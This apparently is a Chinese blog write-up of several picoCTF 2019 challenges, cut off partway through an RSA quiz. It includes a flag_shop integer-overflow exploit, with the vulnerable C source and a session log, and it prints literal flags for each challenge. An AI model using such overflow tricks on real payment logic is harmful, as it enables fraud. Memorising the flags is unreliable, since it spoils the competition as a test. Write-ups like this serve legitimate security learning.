    
    <entry>
      <title><![CDATA[2019picoCTF补充wp(10050分记录)]]></title>
      <url>/ctf-writeup/ckwd5ws65000cd0uc2knot2en/</url>
      <content type="html"><![CDATA[<h1 id="一般技能-General-Skills"><a href="#一般技能-General-Skills" class="headerlink" title="一般技能(General Skills)"></a>一般技能(General Skills)</h1><h2 id="whats-the-difference-Points-200"><a href="#whats-the-difference-Points-200" class="headerlink" title="whats-the-difference - Points: 200"></a>whats-the-difference - Points: 200</h2><blockquote>
<p>Can you spot the difference? kitters cattos. They are also available at /problems/whats-the-difference_0_00862749a2aeb45993f36cc9cf98a47a on the shell server<br>Hints: How do you find the difference between two files?<br>Dumping the data from a hex editor may make it easier to compare.</p>
</blockquote>
<p>这题我完全没有思路,看了github 上ajolliet师傅的wp发现自己学到了很多</p>
<p>以下是解题过程:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C kitters.jpg &gt; kittersfile</span><br><span class="line">hexdump -C cattos.jpg &gt; cattosfile</span><br><span class="line">diff -c kittersfile cattosfile | grep <span class="string">"^!"</span></span><br></pre></td></tr></table></figure>
<p>使用diff命令能很快的比较出两个文件的不同,<code>grep &quot;^!&quot;</code>能把不同的行数行在一起进行对比,于是将不同的地方放在一起比较,提取字符就能得到flag(数据太长就不贴出来了)<br>picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}</p>
<h2 id="flag-shop-Points-300"><a href="#flag-shop-Points-300" class="headerlink" title="flag_shop - Points: 300"></a>flag_shop - Points: 300</h2><blockquote>
<p>There’s a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 14937.<br>Hints: Two’s compliment can do some weird things when numbers get really big!</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the flag exchange\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"We sell flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n1. Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n2. Buy Flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n3. Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Currently for sale\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1. Defintely not the flag Flag\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"2. 1337 Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"These knockoff Flags cost 900 each, enter desired quantity\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">900</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nThe final cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds to complete purchase\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"1337 flags cost 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to buy one"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        FILE *f = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">                        <span class="keyword">if</span>(f == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"flag not found: please run this on the server\n"</span>);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">                        fgets(buf, <span class="number">63</span>, f);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS: %s\n"</span>, buf);</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个商店系统实现的功能有进货劣质品和购买真品,但在代码中存在一个漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">	account_balance = account_balance - total_cost;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当<code>account_balance - total_cost</code>为负数时,他的值会变成正数赋给<code>account_balance</code>,将会使你的账户余额增加,而购买一件劣质品成本需要900块,所以只要使你的进货成本比售价高,就有足够的钱买1337个flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 14937</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">1</span><br><span class="line">These knockoff Flags cost 900 each, enter desired quantity</span><br><span class="line">2147468647</span><br><span class="line">The final cost is: -13500900</span><br><span class="line">Your current balance after transaction: 13502000</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">2</span><br><span class="line">1337 flags cost 100000 dollars, and we only have 1 in stock</span><br><span class="line">Enter 1 to buy one1</span><br><span class="line">YOUR FLAG IS: picoCTF&#123;m0n3y_bag5_e062f0fd&#125;</span><br></pre></td></tr></table></figure></p>
<p>picoCTF{m0n3y_bag5_e062f0fd}</p>
<h2 id="mus1c-Points-300"><a href="#mus1c-Points-300" class="headerlink" title="mus1c - Points: 300"></a>mus1c - Points: 300</h2><blockquote>
<p>I wrote you a song. Put it in the picoCTF{} flag format<br>Hints: Do you think you can master rockstar?</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Pico&apos;s a CTFFFFFFF</span><br><span class="line">my mind is waitin</span><br><span class="line">It&apos;s waitin</span><br><span class="line">Put my mind of Pico into This</span><br><span class="line">my flag is not found</span><br><span class="line">put This into my flag</span><br><span class="line">put my flag into Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">My song&apos;s something</span><br><span class="line">put Pico into This</span><br><span class="line">Knock This down, down, down</span><br><span class="line">put This into CTF</span><br><span class="line">shout CTF</span><br><span class="line">my lyric is nothing</span><br><span class="line">Put This without my song into my lyric</span><br><span class="line">Knock my lyric down, down, down</span><br><span class="line">shout my lyric</span><br><span class="line">Put my lyric into This</span><br><span class="line">Put my song with This into my lyric</span><br><span class="line">Knock my lyric down</span><br><span class="line">shout my lyric</span><br><span class="line">Build my lyric up, up ,up</span><br><span class="line">shout my lyric</span><br><span class="line">shout Pico</span><br><span class="line">shout It</span><br><span class="line">Pico CTF is fun</span><br><span class="line">security is important</span><br><span class="line">Fun is fun</span><br><span class="line">Put security with fun into Pico CTF</span><br><span class="line">Build Fun up</span><br><span class="line">shout fun times Pico CTF</span><br><span class="line">put fun times Pico CTF into my song</span><br><span class="line">build it up</span><br><span class="line">shout it</span><br><span class="line">shout it</span><br><span class="line">build it up, up</span><br><span class="line">shout it</span><br><span class="line">shout Pico</span><br></pre></td></tr></table></figure>
<p>这道题和NCTF的某题很像,可以用这个网址解密 <a href="https://codewithrockstar.com/" target="_blank" rel="noopener">https://codewithrockstar.com/</a><br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>将ascil码转成文本,得到flag</p>
<p>picoCTF{rrrocknrn0113r}</p>
<h2 id="1-wanna-b3-a-r0ck5tar-Points-350"><a href="#1-wanna-b3-a-r0ck5tar-Points-350" class="headerlink" title="1_wanna_b3_a_r0ck5tar - Points: 350"></a>1_wanna_b3_a_r0ck5tar - Points: 350</h2><blockquote>
<p>I wrote you another song. Put the flag in the picoCTF{} flag format</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll is right              </span><br><span class="line">Silence is wrong                </span><br><span class="line">A guitar is a six-string        </span><br><span class="line">Tommy&apos;s been down               </span><br><span class="line">Music is a billboard-burning razzmatazz!</span><br><span class="line">Listen to the music             </span><br><span class="line">If the music is a guitar                  </span><br><span class="line">Say &quot;Keep on rocking!&quot;                </span><br><span class="line">Listen to the rhythm</span><br><span class="line">If the rhythm without Music is nothing</span><br><span class="line">Tommy is rockin guitar</span><br><span class="line">Shout Tommy!                    </span><br><span class="line">Music is amazing sensation </span><br><span class="line">Jamming is awesome presence</span><br><span class="line">Scream Music!                   </span><br><span class="line">Scream Jamming!                 </span><br><span class="line">Tommy is playing rock           </span><br><span class="line">Scream Tommy!       </span><br><span class="line">They are dazzled audiences                  </span><br><span class="line">Shout it!</span><br><span class="line">Rock is electric heaven                     </span><br><span class="line">Scream it!</span><br><span class="line">Tommy is jukebox god            </span><br><span class="line">Say it!                                     </span><br><span class="line">Break it down</span><br><span class="line">Shout &quot;Bring on the rock!&quot;</span><br><span class="line">Else Whisper &quot;That ain&apos;t it, Chief&quot;                 </span><br><span class="line">Break it down</span><br></pre></td></tr></table></figure>
<p>跟着github看了一通rockstar语言,长见识了,然后决定使用rockstar-py工具,将rock文件转换成python语言(只支持python3运行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -W ignore -m rockstarpy lyrics2.rock</span><br></pre></td></tr></table></figure></p>
<p>转换后的文本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll = <span class="literal">True</span></span><br><span class="line">Silence = <span class="literal">False</span></span><br><span class="line">a_guitar = <span class="number">19</span></span><br><span class="line">Tommy = <span class="number">44</span></span><br><span class="line">Music = <span class="number">160</span></span><br><span class="line">the_music = input()</span><br><span class="line"><span class="keyword">if</span> the_music == a_guitar:</span><br><span class="line">    print(<span class="string">"Keep on rocking!"</span>)</span><br><span class="line">    the_rhythm = input()</span><br><span class="line">    <span class="keyword">if</span> the_rhythm - Music == <span class="literal">False</span>:</span><br><span class="line">        Tommy = <span class="number">66</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        Music = <span class="number">79</span></span><br><span class="line">        Jamming = <span class="number">78</span></span><br><span class="line">        print(Music!)</span><br><span class="line">        print(Jamming!)</span><br><span class="line">        Tommy = <span class="number">74</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        They are dazzled audiences</span><br><span class="line">        print(it!)</span><br><span class="line">        Rock = <span class="number">86</span></span><br><span class="line">        print(it!)</span><br><span class="line">        Tommy = <span class="number">73</span></span><br><span class="line">        print(it!)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"Bring on the rock!"</span>)</span><br><span class="line">        Else print(<span class="string">"That ain't it, Chief"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>再将ascil码转换成字符<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = [<span class="number">66</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">74</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">73</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;&#123;&#123;&#125;&#125;&#125;'</span>.format(<span class="string">''</span>.join(map(chr, r)))</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{BONJOVI}</p>
<h1 id="密码学-Cryptography"><a href="#密码学-Cryptography" class="headerlink" title="密码学(Cryptography)"></a>密码学(Cryptography)</h1><h2 id="Mr-Worldwide-Points-200"><a href="#Mr-Worldwide-Points-200" class="headerlink" title="Mr-Worldwide - Points: 200"></a>Mr-Worldwide - Points: 200</h2><blockquote>
<p>A musician left us a message. What’s it mean?</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)&#125;</span><br></pre></td></tr></table></figure>
<p>将坐标点对应google地图,得到一串城市坐标<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;</span><br><span class="line">2QH3+86 Kyoto, Japan</span><br><span class="line">FP9R+Q9 Odesa, Odessa Oblast, Ukraine</span><br><span class="line">QR55+H9 Dayton, Ohio, USA</span><br><span class="line">2X8H+3R Istanbul(Eminönü, Rüstem Paşa, Fatih/İstanbul, Turkey)</span><br><span class="line">F988+MM Abu Dhabi - United Arab Emirates</span><br><span class="line">4MRV+87 Kuala Lumpur, Federal Territory of Kuala Lumpur, Malaysia</span><br><span class="line">_</span><br><span class="line">2Q47+5C Addis Ababa, Ethiopia</span><br><span class="line">2Q6W+9H Loja, Ecuador</span><br><span class="line">9VHW+5R Amsterdam, Netherlands</span><br><span class="line">34PR+7J Sleepy Hollow, New York, USA</span><br><span class="line">QHRV+24 Kodiak, Alaska, USA</span><br><span class="line">6W4F+8R Alexandria, Egypt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>提取每个城市名的首位字母,得到flag<br>picoCTF{KODIAK_ALASKA}</p>
<h2 id="rsa-pop-quiz-Points-200"><a href="#rsa-pop-quiz-Points-200" class="headerlink" title="rsa-pop-quiz - Points: 200"></a>rsa-pop-quiz - Points: 200</h2><blockquote>
<p>Class, take your seats! It’s PRIME-time for a quiz… nc 2019shell1.picoctf.com 61751<br>RSA <a href="https://simple.wikipedia.org/wiki/RSA_algorithm" target="_blank" rel="noopener">info</a></p>
</blockquote>
<p>nc过去后会出很多道关于rsa的题目</p>
<p>第一题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 60413</span><br><span class="line">p : 76753</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">n: 4636878989</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure>
<p>第二题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 54269</span><br><span class="line">n : 5051846941</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">q: 93089</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p>
<p>第三题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">e : 3</span><br><span class="line">n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p>
<p>第四题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 66347</span><br><span class="line">p : 12611</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">totient(n): 836623060</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p>
<p>第五题</p>
<blockquote>
<p>Using the formula: c=plaintext^e mod n.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span><br><span class="line">	e : 3</span><br><span class="line">	n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	ciphertext</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">	#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">	ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span><br><span class="line">	Outstanding move!!!</span><br></pre></td></tr></table></figure>
<p>第六题</p>
<blockquote>
<p>This operation cannot be performed because p and q are not there</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span><br><span class="line">	e : 3</span><br><span class="line">	n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	plaintext</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">	Outstanding move!!!</span><br></pre></td></tr></table></figure>
<p>第七题</p>
<blockquote>
<p>For this we need to use the formula d=e^-1 mod ((p-1)(q-1)).Type (from Crypto.Util.number import *) in python.<br>Now type inverse(e,((p-1)(q-1))) by this you will get the mod.</p>
</blockquote>
